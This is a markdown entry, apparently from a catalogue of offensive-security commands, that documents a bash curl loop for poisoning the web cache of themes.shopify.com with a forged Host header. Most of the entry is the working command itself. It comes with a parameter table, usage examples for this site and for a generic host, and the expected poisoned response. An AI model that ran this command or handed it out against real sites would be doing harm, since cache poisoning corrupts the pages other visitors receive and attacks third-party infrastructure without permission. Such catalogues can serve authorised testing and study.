---
data: >-
  while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H
  "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done
tags:
  - web-cache-poisoning
  - host-header
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: c457e739-964f-44d3-bd77-47a25d6042c6
created_at: '2025-12-13T09:00:34.712Z'
updated_at: '2025-12-13T09:00:34.712Z'
verified: false
validated: true
submitted: true
---
# curl Poison Host Header Loop

## Command

```bash
while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done
```

## Description

This command repeatedly sends a GET request to poison the web cache by setting a custom Host header with a closed port, greps the response for confirmation, and loops continuously to ensure cache hit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-ik` | Ignore certificate errors and show headers | Yes |
| `-H "Host: themes.shopify.com:1337"` | Sets the Host header to include an arbitrary closed port | Yes |
| `|grep ":1337"` | Filters output to check for the poisoned port | Yes |
| `sleep 0;echo 1` | Minimal delay and echo for loop continuation | No |
| `https://themes.shopify.com:443/?g4mm4=hitthecache` | Target URL with query parameter to trigger caching | Yes |

## Examples

### Basic Usage

```bash
while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337"|grep ":1337"; sleep 0;echo 1; done
```

### Advanced Usage

```bash
while true; do curl -ik "https://example.com:443/?param=cache" -H "Host: example.com:9999"|grep ":9999"; sleep 0;echo 1; done
```

## Expected Output

Responses containing elements like <link rel="canonical" href="https://themes.shopify.com:1337/"> if poisoning is successful.

## Related

- [[commands/curl-verify-poisoned-cache-loop]]
- [[procedures/Poison-Web-Cache-with-Modified-Host-Header]]
